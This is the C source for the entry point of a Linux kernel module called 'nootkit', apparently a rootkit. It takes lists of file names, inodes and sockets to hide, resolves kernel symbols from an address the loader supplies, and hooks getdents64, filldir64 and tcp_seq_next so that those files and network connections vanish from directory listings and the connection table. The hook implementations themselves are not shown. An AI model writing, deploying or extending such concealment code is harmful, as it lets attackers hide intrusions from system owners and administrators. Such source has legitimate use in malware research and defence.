#include <linux/export.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/printk.h>
#include <linux/errno.h>

#include <license.h>
#include <ksyms.h>
#include <config.h>
#include <hide.h>

static unsigned long kallsyms_lookup_name_addr;
module_param_named(kallsyms_lookup_name, kallsyms_lookup_name_addr, ulong, 0);

char *hide_filenames[MAX_HIDE_ENTITIES];
int hide_filenames_count;
module_param_array(hide_filenames, charp, &hide_filenames_count, 0);

unsigned long hide_inodes[MAX_HIDE_ENTITIES];
int hide_inodes_count;
module_param_array(hide_inodes, ulong, &hide_inodes_count, 0);

char *hide_sockets_strs[MAX_HIDE_ENTITIES];
int hide_sockets_count;
module_param_array_named(hide_sockets, hide_sockets_strs, charp, &hide_sockets_count, 0);

int nootkit_init(void)
{
    printk(KERN_INFO "Initializing nootkit!\n");

    if (config_parse_globals()) {
        printk(KERN_ERR "nootkit: Configuration parsing failed, aborting");
        return -EINVAL;
    }

    if (!kallsyms_lookup_name_addr) {
        printk(KERN_ERR "nootkit: kallsyms_lookup_name address not supplied, aborting.");
        return -EINVAL;
    }

    if (resolve_ksyms((void *)kallsyms_lookup_name_addr)) {
        printk(KERN_ERR "nootkit: Failed to find all required kernel symbols, aborting.");
        return -EFAULT;
    }

    hide_hook_set_getdents64();
    hide_hook_set_filldir64();
    hide_hook_set_tcp_seq_next();

    return 0;
}

void nootkit_exit(void)
{
    hide_hook_unset_filldir64();
    hide_hook_unset_tcp_seq_next();
    hide_hook_unset_getdents64();

    printk(KERN_INFO "Unloaded nootkit!\n");
}

module_init(nootkit_init);
module_exit(nootkit_exit);
